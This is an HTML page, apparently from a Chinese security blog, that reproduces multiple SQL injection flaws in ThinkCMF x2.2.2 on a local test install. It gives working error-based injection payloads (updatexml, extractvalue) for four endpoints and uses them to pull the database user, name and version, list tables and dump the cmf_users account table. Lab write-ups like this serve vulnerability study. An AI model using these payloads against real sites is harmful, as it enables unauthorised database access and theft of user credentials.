@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+       
+      <meta name="keywords" content="生活，思考 ，渗透，审计，代码。。。" />
+       
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>ThinkcmfSQL注入漏洞复现 |  小透的少年江湖</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/haoyun.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
+      />
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-ThinkcmsSQL注入复现"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  ThinkcmfSQL注入漏洞复现
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time datetime="2021-10-26T01:56:28.000Z" itemprop="datePublished">2021-10-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a> / <a class="article-category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/">Web应用漏洞</a> / <a class="article-category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Thinkcmf/">Thinkcmf</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">593</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">2 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="ThinkCMF-x2-2-2多处SQL注入漏洞复现"><a href="#ThinkCMF-x2-2-2多处SQL注入漏洞复现" class="headerlink" title="ThinkCMF x2.2.2多处SQL注入漏洞复现"></a>ThinkCMF x2.2.2多处SQL注入漏洞复现</h1><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>ThinkCMF是一款基于ThinkPHP+MySQL开发的中文内容管理框架，其中X系列基于ThinkPHP<br>3.2.3开发，最后更新到2.2.2版本。存在多个SQL注入漏洞</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载地址如下：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://github.com/thinkcmf/cmfx/releases">https://github.com/thinkcmf/cmfx/releases</a></p>
+<p><strong>工具</strong></p>
+<p>火狐浏览器</p>
+<p>Hacker插件</p>
+<p>这里下载的是x2.2.2版本进行漏洞复现</p>
+<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/bce12b0d93be364eaf36f549717488e0.png" class>
+
+
+
+<p>在火狐浏览器上访问该thinkcms默认页面index.php(刚开始访问时需要进行安装)</p>
+<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/d4928ad85b1318849c844c189449bd55.png" class>
+
+
+
+<p>为其创建数据库thinkcmf</p>
+<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/bb50a809bd8046609fff8076fa2a7217.png" class>
+
+
+
+<p>安装ThinkCMF成功，环境搭建成功</p>
+<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/3eea1de2a8aef4f9d9bb7d9680acf8a0.png" class>
+
+
+
+<p>通过浏览器访问127.0.0.1&#x2F;thinkcmfx2.2进入前台页面，如下</p>
+<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/4aea1ec411f6001c2cc08018ae1fe0cb.png" class>
+
+
+
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="前台文章编辑出存在漏洞"><a href="#前台文章编辑出存在漏洞" class="headerlink" title="前台文章编辑出存在漏洞"></a>前台文章编辑出存在漏洞</h4><p>构造Payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/thinkcmfx2.2/index.php?g=portal&amp;m=article&amp;a=edit_post</span><br><span class="line"></span><br><span class="line">POST: post[id][0]=bind&amp;post[id][1]=2 and updatexml(1,</span><br><span class="line">concat(0x7e,user(),0x7e),1)-- -</span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用报错注入函数updatexml()函数报错输出用户名(也可以使用extractvalue())</p>
+<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/43237512b8c2f1f11021db6ee973ebb4.png" class>
+
+
+
+<p>修改user()为database()输出数据库名为thinkcmf</p>
+<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/7eaaf40d0f426704f6ff26202d5fe8b2.png" class>
+
+<p>得到数据库后，又得到该数据库版本大于5.0，所以可以使用information_schema这个数据库进行查询。</p>
+<p>Payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/thinkcmfx2.2/index.php?g=portal&amp;m=article&amp;a=edit_pos</span><br><span class="line"></span><br><span class="line">POST: post[id][0]=bind&amp;post[id][1]=2 and extractvalue(1, concat(0x7e,(select</span><br><span class="line">table_name from information_schema.tables where table_schema=&#x27;thinkcmf&#x27; limit</span><br><span class="line">23,1 ),0x7e))-- -</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/3192b554f9e7990f7e0b8f0854e9e4e4.png" class>
+
+
+
+<p>这里本来想使用concat_group()函数输入，但是提示无效使用</p>
+<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/3e9fad8a4e250e95ab38f3288d9bb591.png" class>
+
+<p>就使用limit一个一个的输出thinkcmf数据库中的表(也可以使用暴力破解)</p>
+<p>得到个cmf_users的表，继续查询该表中的账号信息，查询账户密码如下图</p>
+<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/04bcaae9a7b9e47d1e651eec624ac286.png" class>
+
+
+
+<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/a225b280efb348c7a7cb74d14de408e3.png" class>
+
+
+
+<h4 id="后台管理"><a href="#后台管理" class="headerlink" title="后台管理"></a>后台管理</h4><p>后台管理那里，幻灯片的删除存在漏洞。（下面只进行验证，漏洞利用和上面是一样的）</p>
+<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/2014b8e22db83db79ff768f9418f0071.png" class>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Payload: &lt;http://127.0.0.1/cmfx2.2/index.php?g=Admin&amp;m=slide&amp;a=delet&gt;</span><br><span class="line"></span><br><span class="line">ids[]=1&amp;ids[]=0 and updatexml(1, concat(0x7e,user(),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<p>查询获取当前用户为root</p>
+<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/fe0499d2a0a3fca2bdf56a0c800d8f1c.png" class>
+
+
+
+<h4 id="导航编辑"><a href="#导航编辑" class="headerlink" title="导航编辑"></a>导航编辑</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Payload: &lt;http://127.0.0.1/cmfx2.2/index.php?g=Admin&amp;m=nav&amp;a=edit_post&gt;</span><br><span class="line"></span><br><span class="line">Post:  parentid=1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<p>查询获取数据库名为thinkcmf</p>
+<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/38209837e7e2a2dfa380a5bae7f14fcc.png" class>
+
+
+
+<h4 id="评论审核页面"><a href="#评论审核页面" class="headerlink" title="评论审核页面"></a>评论审核页面</h4><img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/f7b367cb9d47e0c17e05fba0a9001a42.png" class>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">http://127.0.0.1/cmfx2.2/index.php?g=Comment&amp;m=commentadmin&amp;a=check&amp;check=1</span><br><span class="line"></span><br><span class="line">POST: ids[]=1&amp;ids[]=2 and updatexml(1,concat(0x7e,version(),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<p>报错输出数据库版本为5.5.53</p>
+<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/7efcd66847ecdf9e77c0b620324df7e6.png" class>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E6%BC%8F%E6%B4%9E-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E-Thinkcmf/" rel="tag">-web漏洞 -框架漏洞 -Thinkcmf</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            后门永久植入
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">wLHK-Discuz漏洞整理</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "BAHT50PldtBLrMFvOb5LqqlL-gzGzoHsz",
+    app_key: "tj3HfiFvtJ3pRIhgXGBqdN7b",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021-2022
+        <i class="ri-heart-fill heart_icon"></i> John Doe
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/haoyun.ico" alt="小透的少年江湖"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="http://shenyu-vip.lofter.com">摄影</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>让我给大家分享喜悦吧！</p>
+  <div class="reward-box">
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/%E5%BE%AE%E4%BF%A1.png">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+ 
+<script src="/js/clickBoom2.js"></script>
+ 
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="86"
+        src="//music.163.com/outchain/player?type=2&id=1858011775&auto=1&height=66"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+    
+
+  </div>
+</body>
+
+</html>
